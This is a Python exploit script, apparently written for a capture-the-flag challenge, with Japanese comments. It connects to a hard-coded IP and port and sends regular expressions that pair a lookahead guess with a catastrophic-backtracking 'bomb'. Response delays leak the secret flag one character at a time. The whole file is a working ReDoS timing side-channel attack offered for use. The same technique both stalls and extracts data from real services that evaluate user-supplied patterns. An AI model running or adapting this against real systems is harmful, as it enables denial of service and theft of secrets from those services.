import socket
import time

HOST = "34.170.146.252"
PORT = 60457

known_flag = "Alpaca\\{"
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}"

# どんな文字にもマッチする条件を8個重ねたペイロード（8^8 = 1677万回の計算を強制）
# ※もしこれでも早すぎる（0.15秒などで返ってくる）場合は、最後にもう一つ `|[^\v]` などを足すと計算量が増える
# `r` は raw string の意味。エスケープシーケンスを無視する。
bomb = r"(?:.|[\s\S]|[\w\W]|[\d\D]|[^\n]|[^\t]|[^\r]|[^\f]){8}!"

print("[*] Advanced ReDoS Blind Attack 開始...")

while True:
    found_char = False

    for char in charset:
        test_prefix = known_flag + char
        payload = f"^(?={test_prefix}){bomb}"

        print(f"[*] Testing '{char}' ... ", end="", flush=True)

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2.0) # 2.0秒フリーズしたら当たりとみなす

        # 応答時間を測定
        start_time = time.time()
        try:
            s.connect((HOST, PORT))
            s.recv(1024)

            start_time = time.time()
            s.sendall((payload + "\n").encode())
            s.recv(1024)

        except socket.timeout:
            pass
        except Exception:
            pass
        finally:
            end_time = time.time()
            s.close()

        elapsed = end_time - start_time
        print(f"{elapsed:.3f} sec")

        # 0.5秒以上かかっていたら、文字が一致した証拠
        if elapsed > 0.5:
            known_flag += char
            clean_flag = known_flag.replace("\\", "")
            print(f"\n[+] 文字特定。現在のフラグ: {clean_flag}\n")
            found_char = True

            # フラグの末尾は } なので、それが出たら終了
            if char == "}":
                print(f"[!] 最終フラグ: {clean_flag}")
                exit(0)

            break

    if not found_char:
        print("\n[-] ペイロードの条件式を一つ増やすか、タイムアウト閾値を下げてください。")
        break